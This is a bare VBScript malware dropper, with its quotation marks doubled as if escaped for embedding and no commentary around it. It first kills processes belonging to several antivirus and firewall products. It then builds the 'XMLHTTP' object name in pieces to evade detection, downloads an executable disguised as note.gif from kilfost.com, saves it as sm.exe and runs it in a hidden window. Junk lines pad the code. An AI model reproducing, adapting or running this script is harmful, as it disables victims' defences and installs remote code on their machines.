WScript.Sleep(5000)
strComputer = "".""
Set objWMIService = GetObject(""winmgmts:"" _
    & ""{impersonationLevel=impersonate}!\\"" & strComputer & ""\root\cimv2"")
Set colProcessList = objWMIService.ExecQuery _ 
    (""SELECT * FROM Win32_Process WHERE Name = 'avpcc.exe'"")
For Each objProcess in colProcessList
    objProcess.Terminate()
Next
strComputer = "".""
Set objWMIService = GetObject(""winmgmts:"" _
    & ""{impersonationLevel=impersonate}!\\"" & strComputer & ""\root\cimv2"")
Set colProcessList = objWMIService.ExecQuery _ 
    (""SELECT * FROM Win32_Process WHERE Name = 'avpm.exe'"")
For Each objProcess in colProcessList
    objProcess.Terminate()
Next
strComputer = "".""
Set objWMIService = GetObject(""winmgmts:"" _
    & ""{impersonationLevel=impersonate}!\\"" & strComputer & ""\root\cimv2"")
Set colProcessList = objWMIService.ExecQuery _ 
    (""SELECT * FROM Win32_Process WHERE Name = 'OUTPOST.EXE'"")
For Each objProcess in colProcessList
    objProcess.Terminate()
Next
strComputer = "".""
Set objWMIService = GetObject(""winmgmts:"" _
    & ""{impersonationLevel=impersonate}!\\"" & strComputer & ""\root\cimv2"")
Set colProcessList = objWMIService.ExecQuery _ 
    (""SELECT * FROM Win32_Process WHERE Name = 'ccapp.exe'"")
For Each objProcess in colProcessList
    objProcess.Terminate()
Next
strComputer = "".""
Set objWMIService = GetObject(""winmgmts:"" _
    & ""{impersonationLevel=impersonate}!\\"" & strComputer & ""\root\cimv2"")
Set colProcessList = objWMIService.ExecQuery _ 
    (""SELECT * FROM Win32_Process WHERE Name = 'DRWEB32.EXE'"")
For Each objProcess in colProcessList
    objProcess.Terminate()
Next
strComputer = "".""
Set objWMIService = GetObject(""winmgmts:"" _
    & ""{impersonationLevel=impersonate}!\\"" & strComputer & ""\root\cimv2"")
Set colProcessList = objWMIService.ExecQuery _ 
    (""SELECT * FROM Win32_Process WHERE Name = 'zonealarm.EXE'"")
For Each objProcess in colProcessList
    objProcess.Terminate()
Next
Dim BD
Dim xml
WScript.Sleep(7000)
f5j545i = ""MLH""
Set xml = CreateObject(""Microsoft.X""+f5j545i+""TTP"")
xml.Open ""GET"", ""http://www.kilfost.com/note.gif"", False
xml.Send
C=C=C=C
BD = xml.ResponseBody
C=C=C=C
Const adTypeBinary = 1
Const adSaveCreateOverWrite = 2
C=C=C=C
Dim BinaryStream
C=C=C=C
Set BinaryStream = CreateObject(""ADODB.Stream"")
BinaryStream.Type = adTypeBinary
A=A=A=A
BinaryStream.Open
BinaryStream.Write BD
b=b=b=b
BinaryStream.SaveToFile ""sm.exe"", adSaveCreateOverWrite

Dim WshShell
Set WshShell = CreateObject(""WScript.Shell"")
WshShell.Run ""sm.exe"", 0, false
